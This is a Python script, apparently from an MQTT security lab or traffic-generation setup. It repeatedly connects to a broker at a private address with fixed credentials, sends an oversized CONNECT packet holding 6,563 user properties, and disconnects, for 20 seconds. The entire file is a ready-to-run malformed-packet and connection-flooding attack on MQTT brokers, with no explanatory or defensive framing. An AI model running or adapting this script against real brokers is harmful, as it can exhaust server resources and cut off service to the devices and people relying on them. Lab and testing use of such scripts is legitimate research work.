import random

import paho.mqtt.client as mqtt
import mqtt_utilities as util
import time


def generate_properties():
    properties = mqtt.Properties(mqtt.PacketTypes.CONNECT)
    key = "k"
    value = "v"
    user_property = []
    for i in range(6563):
        user_property.append((key + str(i), value + str(i)))
    properties.UserProperty = user_property
    return properties


broker = "10.0.0.1"
port = 1883
username = "client1"
password = "pass1"
reconnect_delay = 10
connection = util.Connection_status()
generated_properties = generate_properties()
start_time = time.time()
duration = 20

while True:
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2,
                         userdata=connection, protocol=mqtt.MQTTv5)
    client.username_pw_set(username, password)
    client.on_connect = util.on_connect
    client.on_disconnect = util.on_disconnect
    client.connect(broker, port, properties=generated_properties)
    print("sent malformed CONNECT packet, disconnecting...", flush=True)
    time.sleep(0.1 * random.randint(1, 2))
    client.disconnect()
    elapsed_time = time.time() - start_time
    print("Execution time: " + str(elapsed_time))
    if elapsed_time >= duration:
        print("Time elapsed, script ended")
        break
